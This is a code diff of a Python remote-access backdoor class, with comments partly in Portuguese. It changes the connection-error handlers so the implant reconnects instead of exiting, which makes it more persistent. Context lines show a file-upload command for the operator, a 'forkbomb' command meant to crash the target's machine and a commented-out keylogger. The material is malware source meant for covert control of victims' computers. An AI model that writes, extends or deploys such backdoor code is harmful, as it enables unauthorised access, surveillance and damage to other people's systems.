@@ -220,7 +220,7 @@ class Backdoor:
                     # Upload File ta executando como comando no termianl.. mudar para if, sel
 
                     if message_command_descrypt.startswith("upload "):
-
+                    
                         up_filesize = self.sock.recv(1024).decode("latin1")
                         up_filename = message_command_descrypt.split(" ")[2]
 
@@ -235,7 +235,7 @@ class Backdoor:
 
                         self.sock.send(
                             f"\033[1;32m[+]\033[0;0m - Uploaded to {up_filename} finished! File Size: {str(int_filesize)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...".encode())
-
+                
                     # This is for crash the target's machine
 
                     if message_command_descrypt == "forkbomb":
@@ -291,16 +291,16 @@ class Backdoor:
                 # self.sock.send("You must specify a file".encode())
 
             except BrokenPipeError:
-                print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Exiting...")
-                sys.exit()
+                print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Trying to reconnect!")
+                back.commands_initiating()
 
             except KeyboardInterrupt:
                 print("\nExiting... Bye o/")
                 sys.exit()
 
             except ConnectionResetError:
-                print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Exiting...")
-                sys.exit()
+                print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Trying to reconnect!")
+                back.commands_initiating()
 
     """def keylogger(self, key):
         current_key = str(key)
